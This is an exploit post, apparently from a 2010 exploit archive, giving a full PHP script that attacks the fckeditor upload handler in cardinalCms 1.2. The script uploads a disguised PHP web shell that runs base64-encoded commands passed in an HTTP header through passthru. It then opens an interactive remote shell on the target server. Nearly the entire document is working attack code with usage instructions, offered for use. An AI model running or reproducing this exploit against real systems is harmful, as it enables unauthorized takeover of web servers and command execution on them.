==========================================================
cardinalCms 1.2 (fckeditor) Arbitrary File Upload Exploit.
==========================================================


# Date....................: [21-05-2010]
# Author..................: [Ma3sTr0-Dz]
# Location ...............: [Algeria]
# Software ...............: [cardinalCms 1.2 (fckeditor) Arbitrary File Upload Exploit.]
# Impact..................: [Remote]
# Site Software ..........: [http://www.ckeditor.com]
# Sptnx ..................: [CmOs_Clr & Sec4ever Memberz.]
# Home : .................: [Www.Sec4ever.Com/home/ For Latest 2010 Localz & priv8 Exploits !]
# Contact me : ...........: [o5m@hotmail.de]
 
# Vulnerability: Arbitrary File Upload .

 
# Part ExplOit & Bug Codes :
 
---

<?php
/*
 --------------------------------------------------------------
 cardinalCms 1.2 (fckeditor) Arbitrary File Upload Exploit.
 --------------------------------------------------------------
 By : Ma3sTr0-Dz [ Www.Sec4ever.Com ]

   [-] vulnerable code in /[path]/html/news_fckeditor/editor/filemanager/upload/php/upload.php

 with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious PHP code
*/
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
function http_send($host, $packet)
{
 $sock = fsockopen($host, 80);
 while (!$sock)
 {
  print "\n[-] No response from {$host}:80 Trying again...";
  $sock = fsockopen($host, 80);
 }
 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 return $resp;
}
print "\n+------------------------------------------------------------+";
print "\n|File Upload Exploit by Ma3sTr0-Dz |";
print "\n+------------------------------------------------------------+\n";
if ($argc < 2)
{
 print "\nUsage......: php $argv[0] host path";
 print "\nExample....: php $argv[0] localhost /cardinalCms/\n";
 die();
}
$host = $argv[1];
$path = $argv[2];
$data  = "--12345\r\n";
$data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"s.php.he.ll\"\r\n";
$data .= "Content-Type: application/octet-stream\r\n\r\n";
$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
$data .= "--12345--\r\n";
$packet  = "POST {$path}/news_fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($data)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=12345\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $data;
preg_match("/OnUploadCompleted\((.*),\"(.*)\",\"(.*)\",/i", http_send($host, $packet), $html);
if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
else print "\n[-] Shell uploaded to {$html[2]}...starting it!\n";
define(STDIN, fopen("php://stdin", "r"));
while(1)
{
 print "\nMa3sTr0-Dz-shell# ";
 $cmd = trim(fgets(STDIN));
 if ($cmd != "exit")
 {
  $packet = "GET {$path}datacenter/media/{$html[3]} HTTP/1.0\r\n";
  $packet.= "Host: {$host}\r\n";
  $packet.= "Cmd: ".base64_encode($cmd)."\r\n";
  $packet.= "Connection: close\r\n\r\n";
  $output = http_send($host, $packet);
  if (eregi("print", $output) || !eregi("_code_", $output)) die("\n[-] Exploit failed...\n");
  $shell = explode("_code_", $output);
  print "\n{$shell[1]}";
 }
 else break;
}
?>